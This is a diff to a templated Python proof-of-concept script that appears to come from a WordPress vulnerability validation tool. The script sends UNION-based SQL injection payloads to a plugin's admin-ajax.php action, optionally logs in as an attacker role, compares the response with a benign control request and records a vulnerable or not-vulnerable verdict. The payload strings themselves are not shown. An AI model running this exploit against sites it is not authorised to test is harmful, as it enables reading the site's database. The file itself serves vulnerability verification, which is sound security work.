@@ -1,9 +1,20 @@
 import re
 import requests
+from wp_login import wp_login
+from poc_result import emit_result
 
 TARGET = "{{ target_url }}"
 ACTION = "{{ ajax_action }}"
 PARAM  = "{{ injectable_param }}"
+ATTACKER_ROLE = "{{ attacker_role }}"
+USERNAME = "{{ test_username }}"
+PASSWORD = "{{ test_password }}"
+
+session = requests.Session()
+if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
+    login = wp_login(session, TARGET, USERNAME, PASSWORD)
+    if not login.success:
+        raise RuntimeError(f"attacker login failed: {login.reason}")
 
 # Marker we expect to see echoed back, proving column reflection works.
 MARKER = "WPVH_MARKER_98271"
@@ -18,7 +29,7 @@ PAYLOADS = [
 ]
 
 def test(payload: str) -> tuple[bool, int, str]:
-    resp = requests.post(
+    resp = session.post(
         f"{TARGET}/wp-admin/admin-ajax.php",
         data={"action": ACTION, PARAM: payload},
         timeout=30,
@@ -26,13 +37,27 @@ def test(payload: str) -> tuple[bool, int, str]:
     return MARKER in resp.text, resp.status_code, resp.text[:300]
 
 if __name__ == "__main__":
-    print(f"[*] Testing UNION SQLi: action={ACTION} param={PARAM}")
+    observed = False
+    selected = ""
     for p in PAYLOADS:
         ok, status, body = test(p)
         if ok:
-            print(f"[+] SUCCESS payload={p!r} status={status}")
-            print(f"    response excerpt: {body!r}")
+            observed = True
+            selected = p
             break
-        print(f"[-] No reflection (status={status}): {p!r}")
-    else:
-        print("[!] FAILURE: no UNION SQLi confirmed")
+    control = session.post(
+        f"{TARGET}/wp-admin/admin-ajax.php",
+        data={"action": ACTION, PARAM: "1"},
+        timeout=30,
+    )
+    control_has_marker = MARKER in control.text
+    emit_result(
+        verdict="vulnerable" if observed and not control_has_marker else "not_vulnerable",
+        oracle="response_marker",
+        attacker_role=ATTACKER_ROLE,
+        request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
+        attack={"observed": observed and not control_has_marker, "marker": MARKER, "marker_present": observed, "payload": selected},
+        control={"observed": control_has_marker, "marker_present": control_has_marker, "payload": "1"},
+        confidentiality="high" if observed and not control_has_marker else "none",
+        impact="Injected SQL returned an attacker-selected database marker." if observed and not control_has_marker else "No attack-only SQL response marker was observed.",
+    )
